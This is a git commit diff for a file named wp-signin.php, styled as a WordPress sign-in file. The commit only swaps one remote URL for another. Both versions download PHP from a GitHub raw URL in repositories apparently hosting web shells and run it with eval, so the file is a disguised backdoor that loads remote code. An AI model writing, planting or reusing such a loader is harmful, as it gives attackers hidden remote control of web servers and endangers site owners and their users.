50012c26070d4427838ed56ca10127127a617db8
saudarakita <saudarak893@gmail.com>
2024-10-31 03:19:46 +0700

    Update wp-signin.php

--- wp-signin.php
+++ wp-signin.php
@@ -1,6 +1,6 @@
 <?php
 
-$content = file_get_contents(urldecode('https://raw.githubusercontent.com/HypocriteSEO/shell/main/antidel.php'));
+$content = file_get_contents(urldecode('https://raw.githubusercontent.com/zhyperflowtzy/caritausendiri/main/alfazhyper.php'));
 
 $content = "?> ".$content;
 eval($content);
